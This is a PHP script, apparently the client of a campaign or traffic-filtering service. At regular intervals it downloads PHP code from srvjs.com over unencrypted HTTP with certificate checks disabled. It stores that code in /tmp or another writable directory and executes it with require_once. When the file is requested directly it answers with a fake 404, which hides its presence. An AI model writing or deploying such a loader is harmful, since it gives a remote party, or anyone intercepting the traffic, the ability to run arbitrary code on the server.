<?php
function prevent_direct_access()
{
    if (count(get_included_files()) == 1) {
        //Loading the file directly isn't permitted
        send_404();
        exit;
    }
}

function download_core_files()
{
    if (got_lock()) {
        $ch = init_curl();
        $code = curl_exec($ch);

        //Do not override tacf file unless received code looks valid
        if ($code AND stripos($code, 'nginx/') === false) {
            store_core_files($code);
        }
    }
}

function got_lock()
{
    $lock_file_path = storage_path() . '.lock';

    if (!file_exists($lock_file_path) OR file_age_seconds($lock_file_path) > 10) {
        touch($lock_file_path);

        return true;
    }
}

function local_cache_stale()
{
    $cache_ttl_seconds = 60 * 5;

    return !file_exists(storage_path()) OR file_age_seconds(storage_path()) > $cache_ttl_seconds;
}

function file_age_seconds($path)
{
    return time() - filemtime($path);
}

function curl_extension_missing()
{
    return !extension_loaded('curl');
}

function init_curl()
{
    if (curl_extension_missing()) {
        print "This script requires the curl extension for PHP, please install it before proceeding.";
        exit;
    }

    $ch = curl_init(core_files_remote_url());

    curl_setopt($ch, CURLOPT_HTTPHEADER, ["TA-Campaign-Key: " . $GLOBALS['_ta_campaign_key']]);

    curl_setopt($ch, CURLOPT_ENCODING, ""); //Enables compression
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

    return $ch;
}

function store_core_files($code)
{
    file_put_contents(storage_path(), $code);
}

function storage_path()
{
    return first_writable_directory() . "/tacf";
}

function core_files_remote_url()
{
    $domain = api_domain();

    return "http://{$domain}/get_core_files";
}

function api_domain()
{
    return "srvjs.com";
}

function first_writable_directory()
{
    $possible_writable_locations = [
        sys_get_temp_dir(),
        '/tmp',
        '/var/tmp',
        getcwd(),
    ];

    foreach ($possible_writable_locations as $loc) {
        try {
            if (@is_writable($loc)) {//Suppress warnings
                return $loc;
            }
        } catch (Exception $e) {
            continue;
        }
    }

    print 'The script could not locate any writable directories on your server, please check the permissions of the current directory or "/tmp".';
    exit;
}

function send_404()
{
    $sapi_type = php_sapi_name();
    if (substr($sapi_type, 0, 3) == 'cgi') {
        header("Status: 404 Not Found");
    } else {
        header("HTTP/1.1 404 Not Found");
    }
}

prevent_direct_access();

if (local_cache_stale()) {
    download_core_files();
}

require_once storage_path(); //Loads core files